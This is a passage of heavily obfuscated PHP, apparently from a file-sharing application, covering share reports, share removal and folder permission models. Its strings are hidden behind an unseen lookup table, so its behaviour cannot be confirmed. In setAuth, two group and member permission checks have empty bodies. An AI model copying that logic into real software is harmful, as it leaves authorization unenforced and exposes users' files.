array($b¢â¥‡÷ñ[436] => array($b¢â¥‡÷ñ[380], $C¶–¦ÒÊÆ)); goto Fïµ¤à¶Òˆ; A¶ÃÈì»Ğõ: $b¢â¥‡÷ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $fªÉ·š²æ = array($b¢â¥‡÷ñ[379] => array($b¢â¥‡÷ñ[380], $EˆÙ³„¯Ã”)); $C¶–¦ÒÊÆ = $this->field($b¢â¥‡÷ñ[437])->where($fªÉ·š²æ)->select(); goto C•£–¡‰Ûæ; FÂ½±Ô£Õœ: } public function listAll($d˜¬âšµóù) { goto f’¹×Ü†ã; D’ó¼Ó¶‹¡: if ($d˜¬âšµóù[$bŒªô¾¾Ş[699]]) { $EÓÍâ” š = $d˜¬âšµóù[$bŒªô¾¾Ş[700]] ? $d˜¬âšµóù[$bŒªô¾¾Ş[700]] : strtotime(date($bŒªô¾¾Ş[2216])); $bïˆ‹¤ª‡[$bŒªô¾¾Ş[183]] = array($bŒªô¾¾Ş[317], array($d˜¬âšµóù[$bŒªô¾¾Ş[699]], $EÓÍâ” š)); } if ($d˜¬âšµóù[$bŒªô¾¾Ş[29]]) { $bïˆ‹¤ª‡[$d˜¬âšµóù[$bŒªô¾¾Ş[29]]] = 1; } else { $bïˆ‹¤ª‡[] = array($bŒªô¾¾Ş[442] => array($bŒªô¾¾Ş[922], 0), $bŒªô¾¾Ş[444] => array($bŒªô¾¾Ş[922], 0), $bŒªô¾¾Ş[2191] => $bŒªô¾¾Ş[2160]); } if ($d˜¬âšµóù[$bŒªô¾¾Ş[2156]]) { $bïˆ‹¤ª‡[] = array($bŒªô¾¾Ş[439] => $d˜¬âšµóù[$bŒªô¾¾Ş[2156]], $bŒªô¾¾Ş[1323] => array($bŒªô¾¾Ş[748], "\x25{$d˜¬âšµóù[$bŒªô¾¾Ş[2156]]}\45"), $bŒªô¾¾Ş[2191] => $bŒªô¾¾Ş[2160]); } goto F´·²™ìä‰; D“…‰”‹¨»: return $B¢Œ¢…Ô±; goto d¤£šµ‰¹½; f’¹×Ü†ã: $bŒªô¾¾Ş =& $_SERVER[Ö¹ñÒÁ²÷]; $bïˆ‹¤ª‡ = array(); if ($d˜¬âšµóù[$bŒªô¾¾Ş[1415]]) { $bïˆ‹¤ª‡[$bŒªô¾¾Ş[1415]] = $d˜¬âšµóù[$bŒªô¾¾Ş[1415]]; } goto D’ó¼Ó¶‹¡; F´·²™ìä‰: $B¢Œ¢…Ô± = $this->_makeOrder()->where($bïˆ‹¤ª‡)->selectPage(20); if (empty($B¢Œ¢…Ô±[$bŒªô¾¾Ş[350]])) { return array(); } $this->_listDataApply($B¢Œ¢…Ô±[$bŒªô¾¾Ş[350]]); goto D“…‰”‹¨»; d¤£šµ‰¹½: } public function listDataApply($fÖêùˆíŠ ) { $this->_listDataApply($fÖêùˆíŠ ); return $fÖêùˆíŠ ; } private function _listDataApply(&$FÎ£ä‘†) { $a·…ÁÛè¯» =& $_SERVER[Ö¹ñÒÁ²÷]; $c‡ø²äÕÓ° = array_to_keyvalue($FÎ£ä‘†, $a·…ÁÛè¯»[33], $a·…ÁÛè¯»[1415]); $dó—õ®åÜŠ = Model($a·…ÁÛè¯»[473])->userListInfo(array_unique($c‡ø²äÕÓ°)); $EÄìÜ“›ˆ§ = array_to_keyvalue($FÎ£ä‘†, $a·…ÁÛè¯»[33], $a·…ÁÛè¯»[365]); $B¸Š´¨‘×È = Model($a·…ÁÛè¯»[749])->sourceListInfo($EÄìÜ“›ˆ§, !0); foreach ($FÎ£ä‘† as &$Fğˆ‡ŠËİ™) { $cæ®¿ƒ±êˆ = $Fğˆ‡ŠËİ™[$a·…ÁÛè¯»[1415]]; $Fğˆ‡ŠËİ™[$a·…ÁÛè¯»[2217]] = $dó—õ®åÜŠ[$cæ®¿ƒ±êˆ] ? $dó—õ®åÜŠ[$cæ®¿ƒ±êˆ] : !1; $BäÀˆ“¨© = $Fğˆ‡ŠËİ™[$a·…ÁÛè¯»[365]]; $Fğˆ‡ŠËİ™[$a·…ÁÛè¯»[387]] = $B¸Š´¨‘×È[$BäÀˆ“¨©] ? $B¸Š´¨‘×È[$BäÀˆ“¨©] : !1; } } private function _makeOrder($f™õµ“çå = '') { goto C…ÉõßŒì; C…ÉõßŒì: $Eç¡õ‚İ‡Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $d™Œ¿¾½—¥ = array($Eç¡õ‚İ‡Ñ[183], $Eç¡õ‚İ‡Ñ[700], $Eç¡õ‚İ‡Ñ[2203], $Eç¡õ‚İ‡Ñ[2204]); $eĞœˆ¼³Şì = array($Eç¡õ‚İ‡Ñ[398] => $Eç¡õ‚İ‡Ñ[399], $Eç¡õ‚İ‡Ñ[400] => $Eç¡õ‚İ‡Ñ[401]); goto E„¤è¼Ä×Û; CÅ›¨¯„øâ: $f™õµ“çå = $f™õµ“çå . "{$A²¢¢îçÖ}\40{$e”öÛ¥’Îï}"; return $this->order($f™õµ“çå); goto B¼˜åÇÈõ; E„¤è¼Ä×Û: $A²¢¢îçÖ = Input::get($Eç¡õ‚İ‡Ñ[403], $Eç¡õ‚İ‡Ñ[7], $Eç¡õ‚İ‡Ñ[385], $d™Œ¿¾½—¥); $e”öÛ¥’Îï = Input::get($Eç¡õ‚İ‡Ñ[404], $Eç¡õ‚İ‡Ñ[7], $Eç¡õ‚İ‡Ñ[2218], array($Eç¡õ‚İ‡Ñ[2155], $Eç¡õ‚İ‡Ñ[400])); $e”öÛ¥’Îï = $eĞœˆ¼³Şì[$e”öÛ¥’Îï]; goto CÅ›¨¯„øâ; B¼˜åÇÈõ: } public function reportAdd($e¢¢ŒØæäš) { $BöÖóñºÖÜ =& $_SERVER[Ö¹ñÒÁ²÷]; $a“„¸ß…„ = array($BöÖóñºÖÜ[437] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[437]], $BöÖóñºÖÜ[1415] => USER_ID); if (Model($BöÖóñºÖÜ[2214])->where($a“„¸ß…„)->find()) { return !1; } $D±Í°‡¯÷ = array($BöÖóñºÖÜ[437] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[437]], $BöÖóñºÖÜ[1323] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[1323]], $BöÖóñºÖÜ[365] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[365]], $BöÖóñºÖÜ[415] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[415]], $BöÖóñºÖÜ[1415] => USER_ID, $BöÖóñºÖÜ[29] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[29]], $BöÖóñºÖÜ[401] => $e¢¢ŒØæäš[$BöÖóñºÖÜ[401]]); return Model($BöÖóñºÖÜ[2214])->add($D±Í°‡¯÷); } public function reportList($FÏèèÀ) { goto eÔÖâÂ÷î™; DÛ‘½•»Å: if (empty($e©ïÏÖ‡Œº[$A»ÓÊÊ³ê[350]])) { return array(); } $this->_listDataApply($e©ïÏÖ‡Œº[$A»ÓÊÊ³ê[350]]); return $e©ïÏÖ‡Œº; goto E»Å×Å¡«ğ; eÔÖâÂ÷î™: $A»ÓÊÊ³ê =& $_SERVER[Ö¹ñÒÁ²÷]; $e¥ù÷õõš = array(); if ($FÏèèÀ[$A»ÓÊÊ³ê[699]]) { $b›ŞöÄË© = $FÏèèÀ[$A»ÓÊÊ³ê[700]] ? $FÏèèÀ[$A»ÓÊÊ³ê[700]] : strtotime(date($A»ÓÊÊ³ê[2216])); $e¥ù÷õõš[$A»ÓÊÊ³ê[183]] = array($A»ÓÊÊ³ê[317], array($FÏèèÀ[$A»ÓÊÊ³ê[699]], $b›ŞöÄË©)); } goto cİİŒ¹Ìœã; F®ÉÅ¼·–„: $bôíÖÑĞŸÆ = array($A»ÓÊÊ³ê[398] => $A»ÓÊÊ³ê[399], $A»ÓÊÊ³ê[400] => $A»ÓÊÊ³ê[401]); $EÉÄ‹Ä¸¬Ò = $A»ÓÊÊ³ê[2222] . $bôíÖÑĞŸÆ[$E†­æÙàùÔ]; $e©ïÏÖ‡Œº = Model($A»ÓÊÊ³ê[2214])->where($e¥ù÷õõš)->order($EÉÄ‹Ä¸¬Ò)->selectPage(20); goto DÛ‘½•»Å; cİİŒ¹Ìœã: if (isset($FÏèèÀ[$A»ÓÊÊ³ê[29]]) && in_array($FÏèèÀ[$A»ÓÊÊ³ê[29]], array($A»ÓÊÊ³ê[83], $A»ÓÊÊ³ê[2219], $A»ÓÊÊ³ê[2220], $A»ÓÊÊ³ê[2221], $A»ÓÊÊ³ê[1895]))) { $e¥ù÷õõš[$A»ÓÊÊ³ê[29]] = $FÏèèÀ[$A»ÓÊÊ³ê[29]]; } if (isset($FÏèèÀ[$A»ÓÊÊ³ê[686]]) && in_array($FÏèèÀ[$A»ÓÊÊ³ê[686]], array($A»ÓÊÊ³ê[464], $A»ÓÊÊ³ê[83], $A»ÓÊÊ³ê[2219], $A»ÓÊÊ³ê[2220]))) { $e¥ù÷õõš[$A»ÓÊÊ³ê[686]] = $FÏèèÀ[$A»ÓÊÊ³ê[686]]; } $E†­æÙàùÔ = Input::get($A»ÓÊÊ³ê[404], $A»ÓÊÊ³ê[7], $A»ÓÊÊ³ê[2218], array($A»ÓÊÊ³ê[2155], $A»ÓÊÊ³ê[400])); goto F®ÉÅ¼·–„; E»Å×Å¡«ğ: } public function reportStatus($bÅ¥ŸéÚ“) { goto B¦¤›‡·Œ¦; C„æ¢”ê·°: $fç¾ƒëã¬÷ = Model($e”´¡İŒÄŞ[2214])->where($B§©ŸÃœ‰ò)->save($e¿£É©ê); if ($bÅ¥ŸéÚ“[$e”´¡İŒÄŞ[686]] == $e”´¡İŒÄŞ[2219]) { if ($FŞÛ…éš÷ô[$e”´¡İŒÄŞ[415]] != $e”´¡İŒÄŞ[464] && $this->shareFileMeta($FŞÛ…éš÷ô[$e”´¡İŒÄŞ[415]])) { $this->shareFileMeta($FŞÛ…éš÷ô[$e”´¡İŒÄŞ[415]], 0); } $this->remove($FŞÛ…éš÷ô[$e”´¡İŒÄŞ[437]]); return !0; } if ($fç¾ƒëã¬÷ && $bÅ¥ŸéÚ“[$e”´¡İŒÄŞ[686]] == $e”´¡İŒÄŞ[2220]) { $B‹èï‘‚í¾ = $e¿£É©ê[$e”´¡İŒÄŞ[686]] == $e”´¡İŒÄŞ[2220] ? 1 : 0; $this->shareFileMeta($FŞÛ…éš÷ô[$e”´¡İŒÄŞ[415]], $B‹èï‘‚í¾); $this->removeByFile($FŞÛ…éš÷ô[$e”´¡İŒÄŞ[415]]); } goto BøŠ–‡î™; eÆÖ”ºŞ¶´: if (!$FŞÛ…éš÷ô) { return !1; } $e¿£É©ê = array($e”´¡İŒÄŞ[686] => $bÅ¥ŸéÚ“[$e”´¡İŒÄŞ[686]]); if ($bÅ¥ŸéÚ“[$e”´¡İŒÄŞ[686]] == $e”´¡İŒÄŞ[2220] && $FŞÛ…éš÷ô[$e”´¡İŒÄŞ[686]] == $e”´¡İŒÄŞ[2220]) { $e¿£É©ê[$e”´¡İŒÄŞ[686]] = 0; } goto C„æ¢”ê·°; B¦¤›‡·Œ¦: $e”´¡İŒÄŞ =& $_SERVER[Ö¹ñÒÁ²÷]; $B§©ŸÃœ‰ò = array($e”´¡İŒÄŞ[363] => $bÅ¥ŸéÚ“[$e”´¡İŒÄŞ[363]]); $FŞÛ…éš÷ô = Model($e”´¡İŒÄŞ[2214])->where($B§©ŸÃœ‰ò)->field($e”´¡İŒÄŞ[2223])->find(); goto eÆÖ”ºŞ¶´; BøŠ–‡î™: return $fç¾ƒëã¬÷; goto C¹›˜áØ—ã; C¹›˜áØ—ã: } private function removeByFile($eöÏÚ­¯) { goto Bé»ëÂõ¤; aÁ›Ç˜ñèğ: $F„«ÉƒÚŞ™ = array($dÜÄ˜µÚá[365] => array($dÜÄ˜µÚá[7], $d±º¿™Ü’ñ), $dÜÄ˜µÚá[442] => 1); $AÙ±Ë‹Ãƒœ = Model($dÜÄ˜µÚá[2056])->where($F„«ÉƒÚŞ™)->field($dÜÄ˜µÚá[437])->select(); if (empty($AÙ±Ë‹Ãƒœ)) { return; } goto d»Ñ„ÔåÙŠ; d»Ñ„ÔåÙŠ: $D…‰¥ùÁ = array_to_keyvalue($AÙ±Ë‹Ãƒœ, $dÜÄ˜µÚá[33], $dÜÄ˜µÚá[437]); $this->remove($D…‰¥ùÁ); goto cÔˆ¦ÉËˆ; Bé»ëÂõ¤: $dÜÄ˜µÚá =& $_SERVER[Ö¹ñÒÁ²÷]; $AÙ±Ë‹Ãƒœ = Model($dÜÄ˜µÚá[749])->where(array($dÜÄ˜µÚá[415] => $eöÏÚ­¯))->field($dÜÄ˜µÚá[365])->select(); $d±º¿™Ü’ñ = array_to_keyvalue($AÙ±Ë‹Ãƒœ, $dÜÄ˜µÚá[33], $dÜÄ˜µÚá[365]); goto aÁ›Ç˜ñèğ; cÔˆ¦ÉËˆ: } private function shareFileMeta($E×œìñË­Ÿ, $F“óğÎ™ª = null) { $FƒêŠ‘“•Œ =& $_SERVER[Ö¹ñÒÁ²÷]; $bĞÂÚ¾í˜… = array($FƒêŠ‘“•Œ[415] => $E×œìñË­Ÿ, $FƒêŠ‘“•Œ[89] => $FƒêŠ‘“•Œ[2224]); if (is_null($F“óğÎ™ª)) { return Model($FƒêŠ‘“•Œ[2225])->where($bĞÂÚ¾í˜…)->find(); } $bĞÂÚ¾í˜…[$FƒêŠ‘“•Œ[355]] = $F“óğÎ™ª; Model($FƒêŠ‘“•Œ[2225])->add($bĞÂÚ¾í˜…, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\162\143\145\137\x61\165\x74\x68"; public function getAuth($F¼Å¦¿ŒœÉ) { goto A¿Ş¢¼‰øŒ; A¿Ş¢¼‰øŒ: $cçªËÏÔ×£ =& $_SERVER[Ö¹ñÒÁ²÷]; $aæàİÔå´ï = $cçªËÏÔ×£[2226]; $f¯ìÖ‘°—Ô = array($cçªËÏÔ×£[365] => $F¼Å¦¿ŒœÉ); goto B•—˜»Ò£; B•—˜»Ò£: $Fšó©ïÛÆˆ = $this->field($aæàİÔå´ï)->order($cçªËÏÔ×£[363])->where($f¯ìÖ‘°—Ô)->select(); $Ešë¬¯‰¸Ë = array(); foreach ($Fšó©ïÛÆˆ as $bÕê¨Ô¢çÂ) { if (Model($cçªËÏÔ×£[2227])->listData($bÕê¨Ô¢çÂ[$cçªËÏÔ×£[2208]])) { $Ešë¬¯‰¸Ë[] = $bÕê¨Ô¢çÂ; } } goto CŒ‚ôÊƒ…Î; CŒ‚ôÊƒ…Î: return $Ešë¬¯‰¸Ë; goto eÔóé›Ç; eÔóé›Ç: } public function setAuth($Cï„†—°‘á, $CˆÆ¨Ø›“ö) { goto A©’Ú°­«ù; dé¨œİ¿Æ›: $D ŠîîØ” = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Bà¼¦¾˜æÌ = array(); foreach ($CˆÆ¨Ø›“ö as $fè¶…´ÒÔ‘) { if (!in_array($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[367]], $D ŠîîØ”)) { show_json(LNG($fíƒ‡Òò¯â[2228]), !1); } if ($fí×÷øÆÅ¤ != $dèÒÎé”Ï™) { if ($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[367]] == SourceModel::TYPE_GROUP) { } if ($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[452]] != 0 && !in_array($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[452]], $FˆšÈ°‹ò†)) { } } if ($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[452]] == 0) { $fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[367]] = SourceModel::TYPE_USER; } $Bà¼¦¾˜æÌ[] = array($fíƒ‡Òò¯â[365] => $Cï„†—°‘á, $fíƒ‡Òò¯â[367] => intval($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[367]]), $fíƒ‡Òò¯â[452] => intval($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[452]]), $fíƒ‡Òò¯â[2208] => intval($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[2208]]) ? intval($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[2208]]) : 0, $fíƒ‡Òò¯â[2209] => intval($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[2209]]) ? intval($fè¶…´ÒÔ‘[$fíƒ‡Òò¯â[2209]]) : -1); } goto f’£ÒÍğ”ö; A©’Ú°­«ù: $fíƒ‡Òò¯â =& $_SERVER[Ö¹ñÒÁ²÷]; $B‰–Å‘Î“­ = Model($fíƒ‡Òò¯â[1104])->sourceInfo($Cï„†—°‘á); if ($B‰–Å‘Î“­[$fíƒ‡Òò¯â[367]] != SourceModel::TYPE_GROUP) { return !1; } goto aŒ¹ÄçâÏ; aŒ¹ÄçâÏ: $dèÒÎé”Ï™ = 1; $fí×÷øÆÅ¤ = $B‰–Å‘Î“­[$fíƒ‡Òò¯â[452]]; if ($fí×÷øÆÅ¤ != $dèÒÎé”Ï™) { $bÖ‘­¹Ûø = array($fíƒ‡Òò¯â[2079] => $fí×÷øÆÅ¤); $FˆšÈ°‹ò† = Model($fíƒ‡Òò¯â[2154])->field($fíƒ‡Òò¯â[1415])->where($bÖ‘­¹Ûø)->select(); $FˆšÈ°‹ò† = array_to_keyvalue($FˆšÈ°‹ò†, $fíƒ‡Òò¯â[33], $fíƒ‡Òò¯â[1415]); } goto dé¨œİ¿Æ›; f’£ÒÍğ”ö: $this->where(array($fíƒ‡Òò¯â[379] => $Cï„†—°‘á))->delete(); $this->addAll($Bà¼¦¾˜æÌ); return !0; goto AºÇ¶¤š‹•; AºÇ¶¤š‹•: } public function authClear($fˆÔÈÂê–ù) { $dø×³²˜¾¤ =& $_SERVER[Ö¹ñÒÁ²÷]; $F™µÊ›õŠ = Model($dø×³²˜¾¤[1104])->sourceInfo($fˆÔÈÂê–ù); $AØÚÇçÈ = array($fˆÔÈÂê–ù); if ($F™µÊ›õŠ[$dø×³²˜¾¤[366]] == $dø×³²˜¾¤[83]) { $A¿Ğ—¿‘»ß = array($dø×³²˜¾¤[521] => array($dø×³²˜¾¤[479], $F™µÊ›õŠ[$dø×³²˜¾¤[455]] . $fˆÔÈÂê–ù . $dø×³²˜¾¤[480])); $AØÚÇçÈ = Model($dø×³²˜¾¤[1104])->field($dø×³²˜¾¤[379])->where($A¿Ğ—¿‘»ß)->getField($dø×³²˜¾¤[365], !0); $AØÚÇçÈ[] = $fˆÔÈÂê–ù; } $this->where(array($dø×³²˜¾¤[379] => array($dø×³²˜¾¤[380], $AØÚÇçÈ)))->delete(); return !0; } public function get($a¦¶¼ˆÈÅ«) { $f÷ƒßá‹á = $this->getSourceList(array($a¦¶¼ˆÈÅ«), !0); return $f÷ƒßá‹á[0]; } public function getSourceList($Ağ›„ˆÛ‚, $AÑõ¶Úñâ­ = false) { goto Eå‘óÑî»¬; a•¶äìÖ¢ë: $cŸá°‚í¬ = array_values(array_unique($cŸá°‚í¬)); if (!$cŸá°‚í¬) { return array(); } $EŒáÚñ¢ˆª = $fõ±ñºË‘·[2230]; goto B¢ÑÁÙÃô; a½ğ²ƒ”ø: if (!$AÑõ¶Úñâ­) { $CŠŞ÷Âà„¥ = array($fõ±ñºË‘·[379] => array($fõ±ñºË‘·[380], $Ağ›„ˆÛ‚)); $AÑõ¶Úñâ­ = $c¾ÇÕµËôî->field($fõ±ñºË‘·[2229])->where($CŠŞ÷Âà„¥)->select(); $AÑõ¶Úñâ­ = array_to_keyvalue($AÑõ¶Úñâ­, $fõ±ñºË‘·[365]); } $cŸá°‚í¬ = $Ağ›„ˆÛ‚; foreach ($AÑõ¶Úñâ­ as $a…óˆ¬„ö¢ => $BÒÂ–‹æ“¤) { $A…ŸŒêµáÆ = $c¾ÇÕµËôî->parentLevelArray($BÒÂ–‹æ“¤[$fõ±ñºË‘·[455]]); $cŸá°‚í¬ = array_merge($cŸá°‚í¬, $A…ŸŒêµáÆ, array($a…óˆ¬„ö¢)); } goto a•¶äìÖ¢ë; Eå‘óÑî»¬: $fõ±ñºË‘· =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$Ağ›„ˆÛ‚) { return array(); } $c¾ÇÕµËôî = Model($fõ±ñºË‘·[1104]); goto a½ğ²ƒ”ø; CŞê‡½×‚Á: $D¿Ÿæë¯­È = array(); foreach ($AÑõ¶Úñâ­ as $f‰ŒÄ¾ÂÌ => $e®Ôë°ŒÍ) { $D¿Ÿæë¯­È[$f‰ŒÄ¾ÂÌ] = $this->makeSourceAuth($e®Ôë°ŒÍ, $BÜ‰Å£³Ò¾); } return $D¿Ÿæë¯­È; goto D«¢³ÀÃš¤; B¢ÑÁÙÃô: $CŠŞ÷Âà„¥ = array($fõ±ñºË‘·[379] => array($fõ±ñºË‘·[380], $cŸá°‚í¬)); $BÜ‰Å£³Ò¾ = $this->field($EŒáÚñ¢ˆª)->where($CŠŞ÷Âà„¥)->select(); $BÜ‰Å£³Ò¾ = array_to_keyvalue_group($BÜ‰Å£³Ò¾, $fõ±ñºË‘·[365]); goto CŞê‡½×‚Á; D«¢³ÀÃš¤: } public function authDeepCheck($DÏ°ğ½Ş¤Å, $eóÎ£‹– = false) { $CÖŒÌ©å­± =& $_SERVER[Ö¹ñÒÁ²÷]; if (_get($GLOBALS, $CÖŒÌ©å­±[453])) { return !1; } $b«¯¥˜„â´ = $this->makeAuthDeep(); if (!in_array($DÏ°ğ½Ş¤Å, $b«¯¥˜„â´)) { return !1; } return array($CÖŒÌ©å­±[373] => -1, $CÖŒÌ©å­±[414] => array($CÖŒÌ©å­±[381] => $CÖŒÌ©å­±[1025], $CÖŒÌ©å­±[2085] => $CÖŒÌ©å­±[464], $CÖŒÌ©å­±[382] => LNG($CÖŒÌ©å­±[2231]), $CÖŒÌ©å­±[2097] => $CÖŒÌ©å­±[2232]), $CÖŒÌ©å­±[2233] => array($CÖŒÌ©å­±[384] => $CÖŒÌ©å­±[2234], $CÖŒÌ©å­±[75] => $DÏ°ğ½Ş¤Å)); } protected function makeAuthDeep() { goto bÛ‹²ˆà†ƒ; F‚ÖùŠƒø§: $Câ¤¼Á©Œ¶ = Model($CŞ‘í©æ¯[1104]); $eÍµ´ §š = Model($CŞ‘í©æ¯[454]); if ($E•íĞÏ«à) { $fëÔ¸ † = $Câ¤¼Á©Œ¶->where(array($CŞ‘í©æ¯[365] => array($CŞ‘í©æ¯[380], $E•íĞÏ«à)))->select(); foreach ($fëÔ¸ † as $E™Œ„»ÜŠ§) { $a’™îôöêæ = $Câ¤¼Á©Œ¶->parentLevelArray($E™Œ„»ÜŠ§[$CŞ‘í©æ¯[455]]); $F‡›šëˆÆ© = array_merge($F‡›šëˆÆ©, $a’™îôöêæ); $eŠ°¬¶î‚õ[] = $E™Œ„»ÜŠ§[$CŞ‘í©æ¯[452]]; } } goto f¡ê‘íºÓ›; d»¦ÏÂª™‘: return $F‡›šëˆÆ©; goto A™ØÜ»¨‚; bÛ‹²ˆà†ƒ: $CŞ‘í©æ¯ =& $_SERVER[Ö¹ñÒÁ²÷]; static $F‡›šëˆÆ© = false; if ($F‡›šëˆÆ©) { return $F‡›šëˆÆ©; } goto CÑ…¥½…é; Eß¥ö¬’Ùß: if ($dãƒ´Ÿ…˜Ë) { $Dç›Åê¬ = array(array($CŞ‘í©æ¯[367] => SourceModel::TYPE_USER, $CŞ‘í©æ¯[452] => USER_ID), array($CŞ‘í©æ¯[367] => SourceModel::TYPE_GROUP, $CŞ‘í©æ¯[452] => array($CŞ‘í©æ¯[380], $dãƒ´Ÿ…˜Ë)), $CŞ‘í©æ¯[910] => $CŞ‘í©æ¯[2160]); } if ($EÍ‰ëŠ÷İé) { $Dç›Åê¬ = array($Dç›Åê¬, $CŞ‘í©æ¯[2208] => array($CŞ‘í©æ¯[2236], $EÍ‰ëŠ÷İé)); } $aØÆØÆé = $this->field($CŞ‘í©æ¯[2237])->where($Dç›Åê¬)->select(); goto fÌìãĞ®°¶; f¡ê‘íºÓ›: $eŠ°¬¶î‚õ = array_values(array_unique($eŠ°¬¶î‚õ)); $DâÍ¾µÑÙ“ = $eŠ°¬¶î‚õ; foreach ($DâÍ¾µÑÙ“ as $A¸Ş»–Ï³) { $f™Ò††÷äâ = $eÍµ´ §š->getInfo($A¸Ş»–Ï³); $a’™îôöêæ = $Câ¤¼Á©Œ¶->parentLevelArray($f™Ò††÷äâ[$CŞ‘í©æ¯[455]]); $eŠ°¬¶î‚õ = array_merge($eŠ°¬¶î‚õ, $a’™îôöêæ); } goto Bå¶ŞÖƒîÉ; Bå¶ŞÖƒîÉ: $eŠ°¬¶î‚õ = array_values(array_unique($eŠ°¬¶î‚õ)); foreach ($eŠ°¬¶î‚õ as $A¸Ş»–Ï³) { $f™Ò††÷äâ = $eÍµ´ §š->getInfo($A¸Ş»–Ï³); $F‡›šëˆÆ©[] = $f™Ò††÷äâ[$CŞ‘í©æ¯[387]][$CŞ‘í©æ¯[365]]; } $F‡›šëˆÆ© = array_values(array_unique($F‡›šëˆÆ©)); goto d»¦ÏÂª™‘; bÍ¤§‰¨ğï: $dãƒ´Ÿ…˜Ë = Session::get($CŞ‘í©æ¯[2192]); $dãƒ´Ÿ…˜Ë = array_to_keyvalue($dãƒ´Ÿ…˜Ë, $CŞ‘í©æ¯[33], $CŞ‘í©æ¯[2079]); $Dç›Åê¬ = array($CŞ‘í©æ¯[367] => SourceModel::TYPE_USER, $CŞ‘í©æ¯[452] => USER_ID); goto Eß¥ö¬’Ùß; CÑ…¥½…é: $Aó×¥ÕÜÜƒ = Model($CŞ‘í©æ¯[2235])->listData(); $EÍ‰ëŠ÷İé = array(); foreach ($Aó×¥ÕÜÜƒ as $CÇÏ¨ë—Ñ) { if ($CÇÏ¨ë—Ñ[$CŞ‘í©æ¯[372]] == 0 && $CÇÏ¨ë—Ñ[$CŞ‘í©æ¯[2099]] == $CŞ‘í©æ¯[83]) { $EÍ‰ëŠ÷İé[] = $CÇÏ¨ë—Ñ[$CŞ‘í©æ¯[363]]; } } goto bÍ¤§‰¨ğï; fÌìãĞ®°¶: $E•íĞÏ«à = array_to_keyvalue($aØÆØÆé, $CŞ‘í©æ¯[33], $CŞ‘í©æ¯[365]); $F‡›šëˆÆ© = array(); $eŠ°¬¶î‚õ = $dãƒ´Ÿ…˜Ë; goto F‚ÖùŠƒø§; A™ØÜ»¨‚: } private function makeSourceAuth($bŞó™Ò›¯Ü, $F‚íÄîÇØ) { goto e²ÕÕ¼Óª; Cë–ŸÉ©ùö: if (!$Fß“òáÒ && $bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[367]] == SourceModel::TYPE_GROUP) { $Aí“ÔšÑ–É = Model($cã¬‚¬Ö¸°[454])->getInfo($bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[452]]); $e¢Ü·ãó¥ = explode($cã¬‚¬Ö¸°[47], trim($e¶­á„äó…[$cã¬‚¬Ö¸°[455]], $cã¬‚¬Ö¸°[47])); foreach ($e¢Ü·ãó¥ as $aĞğ¬‚„Ï¸) { if ($aĞğ¬‚„Ï¸ == $cã¬‚¬Ö¸°[464] || $aĞğ¬‚„Ï¸ == $a»¼öÌÛˆù) { continue; } if (!isset($c—÷õéä‡†[$aĞğ¬‚„Ï¸])) { continue; } $F­Ùê‰ùÊ÷ = $c—÷õéä‡†[$aĞğ¬‚„Ï¸]; $Fß“òáÒ = array($cã¬‚¬Ö¸°[2238] => intval($F­Ùê‰ùÊ÷[$cã¬‚¬Ö¸°[372]][$cã¬‚¬Ö¸°[372]]), $cã¬‚¬Ö¸°[2239] => $F­Ùê‰ùÊ÷[$cã¬‚¬Ö¸°[372]], $cã¬‚¬Ö¸°[2233] => array($cã¬‚¬Ö¸°[384] => $cã¬‚¬Ö¸°[2242], $cã¬‚¬Ö¸°[2243] => $Aí“ÔšÑ–É[$cã¬‚¬Ö¸°[387]][$cã¬‚¬Ö¸°[365]], $cã¬‚¬Ö¸°[2241] => $Aí“ÔšÑ–É[$cã¬‚¬Ö¸°[459]])); break; } } if ((!$Fß“òáÒ || $Fß“òáÒ[$cã¬‚¬Ö¸°[373]] <= 0) && $bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[367]] == SourceModel::TYPE_GROUP) { $fŞ„¢ç¸Ï = $this->authDeepCheck($bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[365]], $Fß“òáÒ); if ($fŞ„¢ç¸Ï) { $Fß“òáÒ = $fŞ„¢ç¸Ï; } } return $Fß“òáÒ; goto EÊî£¢Æš; aÅçàá¾à: $a»¼öÌÛˆù = $cã¬‚¬Ö¸°[83]; $B®İö ‡õô = Model($cã¬‚¬Ö¸°[1104])->parentLevelArray($bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[455]]); $B®İö ‡õô = array_merge(array($bŞó™Ò›¯Ü[$cã¬‚¬Ö¸°[365]]), array_reverse($B®İö ‡õô)); goto b£Æì¸ëÃ; e²ÕÕ¼Óª: $cã¬‚¬Ö¸° =& $_SERVER[Ö¹ñÒÁ²÷]; $c—÷õéä‡† = Session::get($cã¬‚¬Ö¸°[2192]); $c—÷õéä‡† = array_to_keyvalue($c—÷õéä‡†, $cã¬‚¬Ö¸°[2079]); goto aÅçàá¾à; b£Æì¸ëÃ: $Fß“òáÒ = !1; foreach ($B®İö ‡õô as $e¹ÏåÎœ©ã) { if (!isset($F‚íÄîÇØ[$e¹ÏåÎœ©ã])) { continue; } $A¨Ğ¦„¹ŒÙ = $this->authMake($F‚íÄîÇØ[$e¹ÏåÎœ©ã]); if ($A¨Ğ¦„¹ŒÙ[$cã¬‚¬Ö¸°[414]]) { $Fß“òáÒ = $A¨Ğ¦„¹ŒÙ; 